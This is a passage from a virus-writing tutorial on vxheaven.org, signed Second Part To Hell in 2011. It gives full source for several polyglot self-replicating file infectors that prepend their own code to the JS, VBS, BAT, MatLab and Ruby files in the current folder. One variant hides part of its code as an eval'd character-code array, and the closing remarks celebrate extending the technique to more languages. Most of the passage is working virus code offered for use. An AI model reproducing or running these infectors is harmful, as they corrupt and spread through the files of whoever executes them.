&nbsp; &nbsp; &nbsp; &nbsp; g=f.<span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color:#CC00FF; font-weight:bold;">File</span>.<span style="color:#9900CC;">size</span><span style="color: black;">&#40;</span>f<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span>;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> !g.<span style="color:#9900CC;">index</span><span style="color: black;">&#40;</span><span style="color:#996600;">'vir'</span><span style="color: black;">&#41;</span>;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; f.<span style="color:#9900CC;">rewind</span>;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; f.<span style="color:#CC0066; font-weight:bold;">print</span> b<span style="color:#006600; font-weight:bold;">+</span>g;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span>;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; f.<span style="color:#9900CC;">close</span>;<br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span>;<br/>
<span style="color:#9966CC; font-weight:bold;">end</span>;<br/>
c.<span style="color:#9900CC;">close</span>;<br/>
&nbsp;</div>
<h2><a name="c4"></a>4) Full infectors</h2>
<h3><a name="c41"></a>4.1) JS/VBS/BATch/MatLab infector</h3>
<p>Now lets see the whole full infector:</p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">rem<span style="color: #339933;">=</span><span style="color: #CC0000;">4</span><span style="color: #339933;">%</span>2<span style="color: #339933;">;</span>a<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> ActiveXObject<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;scripting.filesystemobject&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000066; font-weight: bold;">for</span><span style="color: black;">&#40;</span>d<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> Enumerator<span style="color: black;">&#40;</span>a.<span style="color: #660066;">getfolder</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;.&quot;</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">files</span><span style="color: black;">&#41;</span><span style="color: #339933;">;!</span>d.<span style="color: #660066;">atEnd</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>d.<span style="color: #660066;">moveNext</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span>f<span style="color: #339933;">=</span>a.<span style="color: #660066;">getextensionname</span><span style="color: black;">&#40;</span>e<span style="color: #339933;">=</span>d.<span style="color: #660066;">item</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">toLowerCase</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>f<span style="color: #339933;">==</span><span style="color: #3366CC;">&quot;js&quot;</span><span style="color: #339933;">||</span>f<span style="color: #339933;">==</span><span style="color: #3366CC;">&quot;vbs&quot;</span><span style="color: #339933;">||</span>f<span style="color: #339933;">==</span><span style="color: #3366CC;">&quot;bat&quot;</span><span style="color: #339933;">||</span>f<span style="color: #339933;">==</span><span style="color: #3366CC;">&quot;m&quot;</span><span style="color: black;">&#41;</span><span style="color: #000066; font-weight: bold;">try</span><span style="color: black;">&#123;</span>f<span style="color: #339933;">=</span>a.<span style="color: #660066;">getfile</span><span style="color: black;">&#40;</span>e<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>g<span style="color: #339933;">=</span>f.<span style="color: #660066;">attributes</span><span style="color: #339933;">;</span>f.<span style="color: #660066;">attributes</span><span style="color: #339933;">=</span><span style="color: #CC0000;">0</span><span style="color: #339933;">;</span>b<span style="color: #339933;">=</span>a.<span style="color: #660066;">opentextfile</span><span style="color: black;">&#40;</span>e<span style="color: black;">&#41;</span>.<span style="color: #660066;">readall</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>b.<span style="color: #660066;">search</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;vir&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">&lt;</span><span style="color: #CC0000;">0</span><span style="color: black;">&#41;</span>a.<span style="color: #660066;">opentextfile</span><span style="color: black;">&#40;</span>e<span style="color: #339933;">,</span><span style="color: #CC0000;">2</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">write</span><span style="color: black;">&#40;</span>a.<span style="color: #660066;">opentextfile</span><span style="color: black;">&#40;</span>WScript.<span style="color: #660066;">scriptfullname</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">readall</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">substr</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">0</span><span style="color: #339933;">,</span><span style="color: #CC0000;">1251</span><span style="color: black;">&#41;</span><span style="color: #339933;">+</span>b<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>f.<span style="color: #660066;">attributes</span><span style="color: #339933;">=</span>g<span style="color: #339933;">;</span><span style="color: black;">&#125;</span><span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>z<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><span style="color: black;">&#125;</span><span style="color: black;">&#125;</span><span style="color: #006600; font-style: italic;">/*<br/>
'';a=fopen([mfilename '.m']);b=[char(fread(a,1251))]';fclose(a);c={'*.js','*.vbs','*.bat','*.m'};for d=1:length(c)e=dir(c{d});for f=1:length(e)g=fopen(e(f).name,'r+');h=fread(g,'*char')';frewind(g);if isempty(strfind(h,'vir'))fwrite(g,[b h]);end;fclose(g);end;end;if 0<br/>
on error resume next:set a=createobject(&quot;scripting.filesystemobject&quot;):set d=a.getfolder(&quot;.&quot;):for each e in d.files:f=lcase(a.getextensionname(e)):if f=&quot;js&quot;or f=&quot;vbs&quot; or f=&quot;bat&quot; or f=&quot;m&quot;then:f=e.attributes:e.attributes=0:b=a.opentextfile(e).readall:if instr(b,&quot;vir&quot;)=0then a.opentextfile(e,2).write mid(a.opentextfile(wscript.scriptfullname).readall,1,1251)+b:end if:e.attributes=f:end if:next<br/>
'';end;%%&amp;for %%a in (*.js *.vbs *.bat *.m)do (find &quot;vir&quot; %%a&amp;if ERRORLEVEL 1 find &quot;vir&quot;&lt;%0&gt;a&amp;copy a /b + %%a /b b &amp; move /y b %%a)&amp;del a b&amp;cls&amp; */</span><br/>
&nbsp;</div>
<p>The empty last line is a must.</p>
<h3><a name="c42"></a>4.2) Ruby/JScript infector</h3>
<div class="ruby" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color:#006600; font-weight:bold;">//</span>;a=<span style="color:#CC00FF; font-weight:bold;">File</span>.<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span><span style="color:#0000FF; font-weight:bold;">__FILE__</span><span style="color: black;">&#41;</span>;b=a.<span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color:#006666;">703</span><span style="color: black;">&#41;</span>;a.<span style="color:#9900CC;">close</span>;c=<span style="color:#CC00FF; font-weight:bold;">Dir</span>.<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span><span style="color:#CC00FF; font-weight:bold;">Dir</span>.<span style="color:#9900CC;">getwd</span><span style="color: black;">&#41;</span>;c.<span style="color:#9900CC;">each</span> <span style="color:#9966CC; font-weight:bold;">do</span> <span style="color:#006600; font-weight:bold;">|</span>d<span style="color:#006600; font-weight:bold;">|</span> e=<span style="color:#CC00FF; font-weight:bold;">File</span>.<span style="color:#9900CC;">extname</span><span style="color: black;">&#40;</span>d<span style="color: black;">&#41;</span>;<span style="color:#9966CC; font-weight:bold;">if</span> <span style="color:#CC00FF; font-weight:bold;">File</span>.<span style="color:#9900CC;">ftype</span><span style="color: black;">&#40;</span>d<span style="color: black;">&#41;</span>==<span style="color:#996600;">&quot;file&quot;</span> <span style="color:#006600; font-weight:bold;">&amp;&amp;</span> <span style="color: black;">&#40;</span>e==<span style="color:#996600;">&quot;.bat&quot;</span><span style="color:#006600; font-weight:bold;">||</span>e==<span style="color:#996600;">&quot;.m&quot;</span><span style="color:#006600; font-weight:bold;">||</span>e==<span style="color:#996600;">&quot;.rb&quot;</span><span style="color: black;">&#41;</span>;f=<span style="color:#CC00FF; font-weight:bold;">File</span>.<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span>d,<span style="color:#996600;">&quot;r+&quot;</span><span style="color: black;">&#41;</span>;g=f.<span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color:#CC00FF; font-weight:bold;">File</span>.<span style="color:#9900CC;">size</span><span style="color: black;">&#40;</span>f<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span>;<span style="color:#9966CC; font-weight:bold;">if</span> !g.<span style="color:#9900CC;">index</span><span style="color: black;">&#40;</span><span style="color:#996600;">'vir'</span><span style="color: black;">&#41;</span>;f.<span style="color:#9900CC;">rewind</span>;f.<span style="color:#CC0066; font-weight:bold;">print</span> b<span style="color:#006600; font-weight:bold;">+</span>g;<span style="color:#9966CC; font-weight:bold;">end</span>;f.<span style="color:#9900CC;">close</span>;<span style="color:#9966CC; font-weight:bold;">end</span>;<span style="color:#9966CC; font-weight:bold;">end</span>;c.<span style="color:#9900CC;">close</span>;<span style="color:#9966CC; font-weight:bold;">if</span> <span style="color:#0000FF; font-weight:bold;">nil</span><br/>
<span style="color:#CC0066; font-weight:bold;">eval</span><span style="color: black;">&#40;</span><span style="color:#996600;">'a=new ActiveXObject(&quot;scripting.filesystemobject&quot;);for(d=new Enumerator(a.getfolder(&quot;.&quot;).files);!d.atEnd();d.moveNext()){f=a.getextensionname(e=d.item()).toLowerCase();if(f==&quot;js&quot;||f==&quot;rb&quot;)try{f=a.getfile(e);g=f.attributes;f.attributes=0;b=a.opentextfile(e).readall();if(b.search(&quot;vir&quot;)&lt;0)a.opentextfile(e,2).write(a.opentextfile(WScript.scriptfullname).readall().substr(0,703)+b);f.attributes=g;}catch(z){}}'</span><span style="color: black;">&#41;</span>;<span style="color:#006600; font-weight:bold;">//</span>;<span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp;</div>
<h3><a name="c43"></a>4.3) Ruby/BATch/MatLab infector</h3>
<div class="ruby" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">rem=4%2;a=File.open(__FILE__);b=a.read(1458);a.close;c=Dir.open(Dir.getwd);c.each do |d| e=File.extname(d);if File.ftype(d)==&quot;file&quot; &amp;&amp; (e==&quot;.bat&quot;||e==&quot;.m&quot;||e==&quot;.rb&quot;);f=File.open(d,&quot;r+&quot;);g=f.read(File.size(f));if !g.index('vir');f.rewind;f.print b+g;end;f.close;end;end;c.close;if nil<br/>
vir=1458;eval(char([97,61,102,111,112,101,110,40,91,109,102,105,108,101,110,97,109,101,32,39,46,109,39,93,41,59,102,111,112,101,110,40,91,109,102,105,108,101,110,97,109,101,32,39,46,109,39,93,41,59,98,61,91,99,104,97,114,40,102,114,101,97,100,40,97,44,118,105,114,41,41,93,39,59,102,99,108,111,115,101,40,97,41,59,99,61,123,39,42,46,118,98,115,39,44,39,42,46,98,97,116,39,44,39,42,46,109,39,44,39,42,46,114,98,39,125,59,102,111,114,32,100,61,49,58,108,101,110,103,116,104,40,99,41,101,61,100,105,114,40,99,123,100,125,41,59,102,111,114,32,102,61,49,58,108,101,110,103,116,104,40,101,41,103,61,102,111,112,101,110,40,101,40,102,41,46,110,97,109,101,44,39,114,43,39,41,59,104,61,102,114,101,97,100,40,103,44,39,42,99,104,97,114,39,41,39,59,102,114,101,119,105,110,100,40,103,41,59,105,102,32,105,115,101,109,112,116,121,40,115,116,114,102,105,110,100,40,104,44,39,118,105,114,39,41,41,102,119,114,105,116,101,40,103,44,91,98,32,104,93,41,59,101,110,100,59,102,99,108,111,115,101,40,103,41,59,101,110,100,59,101,110,100]));<br/>
%w[];%w[];end;#&amp;for %%a in (*.bat *.m *.rb)do (find &quot;vir&quot; %%a&amp;if ERRORLEVEL 1 find &quot;vir&quot;<span style="color:#006600; font-weight:bold;">&lt;%</span>0<span style="color:#006600; font-weight:bold;">&gt;</span>a<span style="color:#006600; font-weight:bold;">&amp;</span>copy a <span style="color:#006600; font-weight:bold;">/</span>b <span style="color:#006600; font-weight:bold;">+</span> <span style="color:#006600; font-weight:bold;">%%</span>a <span style="color:#006600; font-weight:bold;">/</span>b b <span style="color:#006600; font-weight:bold;">&amp;</span> move <span style="color:#006600; font-weight:bold;">/</span>y b <span style="color:#006600; font-weight:bold;">%%</span>a<span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">&amp;</span>del a b<span style="color:#006600; font-weight:bold;">&amp;</span>cls<br/>
&nbsp;</div>
<h2><a name="c5"></a>5) Conclusion</h2>
<p>So now we have infectors that can target three or even four different languages, with the same code. Isn't that beautiful? :-)</p>
<p>Question: What next? Answere: 5, 6, 7, 8 ... languages :-D</p>
<div align="right">Second Part To Hell<br/>August 2011</div>
[<a style="" href="/lib/?lang=EN&amp;index=MA#vsp43">Back to index</a>] [<a href="/lib/vsp43.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vsp43">de</a><a href="/lib/index.php?lang=en&amp;id=vsp43">en</a><a href="/lib/index.php?lang=es&amp;id=vsp43">es</a><a href="/lib/index.php?lang=it&amp;id=vsp43">it</a><a href="/lib/index.php?lang=fr&amp;id=vsp43">fr</a><a href="/lib/index.php?lang=pl&amp;id=vsp43">pl</a><a href="/lib/index.php?lang=ru&amp;id=vsp43">ru</a><a href="/lib/index.php?lang=ua&amp;id=vsp43">ua</a></div>
</body>
</html>
